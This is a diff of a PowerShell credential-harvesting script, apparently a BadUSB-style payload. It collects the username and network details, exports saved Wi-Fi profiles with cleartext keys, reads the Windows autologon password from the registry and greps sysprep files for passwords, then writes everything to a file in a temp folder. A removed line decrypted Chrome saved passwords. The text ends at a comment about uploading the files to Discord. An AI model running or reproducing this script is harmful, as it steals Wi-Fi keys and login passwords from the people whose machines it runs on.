@@ -4,9 +4,7 @@
 
 #------------------------------------------------------------------------------------------------------------------------------------
 $null = New-Item -Path $env:temp -Name "F13C3D8F-8A17-4898-A36A-6294A160288A" -ItemType "directory"
-Set-Location -Path "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A"
-
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd).txt"
+$FileName = "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A/$env:USERNAME-$(get-date -f yyyy-MM-dd).txt"
 
 #------------------------------------------------------------------------------------------------------------------------------------
 # Network info
@@ -49,10 +47,13 @@ $MAC
 $output > $FileName
 
 ############################################################################################################################################################
+Set-Location -Path "$env:temp/F13C3D8F-8A17-4898-A36A-6294A160288A"
 
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String >> $FileName
+$null = netsh wlan export profile key=clear; 
 
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Contenu de la clé\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | Format-Table -AutoSize | Out-String >> $FileName
+Select-String -Path *.xml -Pattern 'keyMaterial'>> $FileName;
+
+
 ############################################################################################################################################################
 
 ##
@@ -61,8 +62,8 @@ $output > $FileName
 
 $AutoLoginPassword = Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" | Select-Object -Property "DefaultUserName","DefaultPassword"
 If (($AutoLoginPassword).DefaultPassword) {
-  $Autlog = "Auto Login Credentials Found:" $AutoLoginPassword
-  $Autlog >> $FileName
+  $AutoLoginPassword >> $FileName
+  #$Autlog >> $FileName
   }  # End If
 
 # Sysprep
@@ -70,14 +71,12 @@ $PassFiles = "C:\Windows\sysprep\sysprep.xml","C:\Windows\sysprep\sysprep.inf","
 ForEach ($PassFile in $PassFiles) {
   If (Test-Path -Path $PassFile) {
     $Syspass = Get-Content -Path $PassFile | Select-String -Pattern "Password"
-    $Sysprep = "Sysprep password :" $Syspass
-    $Sysprep >> $Filename
+   # $Sysprep = "Sysprep password :" $Syspass
+    $Syspass >> $Filename
   }  # End If
 }  # End ForEach
 
-# Chrome
-[System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.ProtectedData]::Unprotect($DataRow.password_value,$Null,[System.Security.Cryptography.DataProtectionScope]::CurrentUser)) >> $FileName
-##
+
 #--------------------------------------------------------------------------------------------------------------------------------------
 
 # This is to upload your files to discord
